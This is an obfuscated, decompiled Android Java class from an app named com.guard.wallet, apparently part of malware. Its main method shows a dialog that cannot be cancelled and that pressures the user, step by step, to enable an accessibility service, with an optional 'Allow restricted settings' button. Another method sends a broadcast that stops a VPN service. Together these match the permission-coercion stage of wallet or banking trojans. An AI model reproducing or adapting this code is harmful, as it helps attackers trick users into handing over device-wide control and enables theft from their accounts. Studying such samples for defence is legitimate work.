package com.guard.wallet.utils;

import a1.q;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.activity.GuideActivity;
import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public abstract class b {
   public static WeakReference a;
   public static final AtomicBoolean b = new AtomicBoolean(true);
   public static volatile WeakReference c;
   public static final AtomicInteger d = new AtomicInteger(0);
   public static final AtomicInteger e = new AtomicInteger(0);
   public static final AtomicInteger f = new AtomicInteger(0);
   public static final AtomicInteger g = new AtomicInteger(0);

   public static void a() {
      if (e.b.a() != null && (c == null || c.get() == null || c.get() instanceof GuideActivity)) {
         Log.d("AccessibilityUtils", "showGuideActivity");
         com.guard.wallet.utils.g.d1(e.b.a().getPackageName(), GuideActivity.class.getName());
      }
   }

   public static void b() {
      WeakReference var0 = a;
      if (var0 != null && var0.get() != null) {
         ((AlertDialog)a.get()).dismiss();
         a = null;
      }
   }

   public static String c() {
      String var0 = com.guard.wallet.utils.d.e().concat("/guide/").concat(String.valueOf(d.get()));
      Log.d("AccessibilityUtils", var0);
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void d(Activity var0) {
      synchronized (Activity.class){} // $VF: monitorenter 

      Throwable var10000;
      label101: {
         try {
            WeakReference var1 = new WeakReference<>(var0);
            c = var1;
            if (c != null && c.get() != null) {
               Intent var14 = new Intent();
               var14.setAction("guide.vpn.service.stop.action");
               ((Activity)c.get()).sendBroadcast(var14);
            }

            // $VF: monitorexit
         } catch (Throwable var13) {
            var10000 = var13;
            boolean var10001 = false;
            break label101;
         }

         label98:
         try {
            return;
         } catch (Throwable var12) {
            var10000 = var12;
            boolean var16 = false;
            break label98;
         }
      }

      while (true) {
         Throwable var15 = var10000;

         try {
            // $VF: monitorexit
            throw var15;
         } catch (Throwable var11) {
            var10000 = var11;
            boolean var17 = false;
            continue;
         }
      }
   }

   public static void e() {
      if (com.guard.wallet.utils.g.Z() != null) {
         new Handler(Looper.getMainLooper()).post(new com.guard.wallet.helper.f(6));
      }
   }

   public static void f() {
      if (e.b.a() != null) {
         WeakReference var0 = a;
         if (var0 == null || var0.get() == null || !((AlertDialog)a.get()).isShowing()) {
            Integer var4 = com.guard.wallet.utils.d.a;
            String var5;
            if (MainApplication.getInstance() != null
               && MainApplication.getInstance().getBuildConfig() != null
               && !q.B(MainApplication.getInstance().getBuildConfig().getAlertTitle())) {
               var5 = MainApplication.getInstance().getBuildConfig().getAlertTitle();
            } else {
               var5 = "Open [accessibility_service_label]";
            }

            String var2;
            if (MainApplication.getInstance() != null
               && MainApplication.getInstance().getBuildConfig() != null
               && !q.B(MainApplication.getInstance().getBuildConfig().getAlertMsg())) {
               var2 = MainApplication.getInstance().getBuildConfig().getAlertMsg();
            } else {
               var2 = "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]";
            }

            if (MainApplication.getInstance() != null
               && MainApplication.getInstance().getBuildConfig() != null
               && !q.B(MainApplication.getInstance().getBuildConfig().getAlertRestrictedMsg())) {
               MainApplication.getInstance().getBuildConfig().getAlertRestrictedMsg();
            }

            String var1;
            if (MainApplication.getInstance() != null
               && MainApplication.getInstance().getBuildConfig() != null
               && !q.B(MainApplication.getInstance().getBuildConfig().getOkText())) {
               var1 = MainApplication.getInstance().getBuildConfig().getOkText();
            } else {
               var1 = "Go immediately";
            }

            Builder var3 = new Builder(e.b.a(), 4);
            var3.setCustomTitle(new e0.a(e.b.a(), var5));
            var3.setMessage(var2);
            var3.setCancelable(false);
            if (!b.get()) {
               String var6;
               if (MainApplication.getInstance() != null
                  && MainApplication.getInstance().getBuildConfig() != null
                  && !q.B(MainApplication.getInstance().getBuildConfig().getAllowRestricted())) {
                  var6 = MainApplication.getInstance().getBuildConfig().getAllowRestricted();
               } else {
                  var6 = "Allow restricted settings";
               }

               var3.setNeutralButton(var6, new com.guard.wallet.helper.j(1));
            }

            var3.setPositiveButton(var1, new com.guard.wallet.helper.j(2));
            var3.setOnDismissListener(new com.guard.wallet.helper.k(1));
            var3.setOnCancelListener(new a());
            var0 = new WeakReference<>(var3.create());
            a = var0;
            ((AlertDialog)var0.get()).show();
         }
      }
   }
}
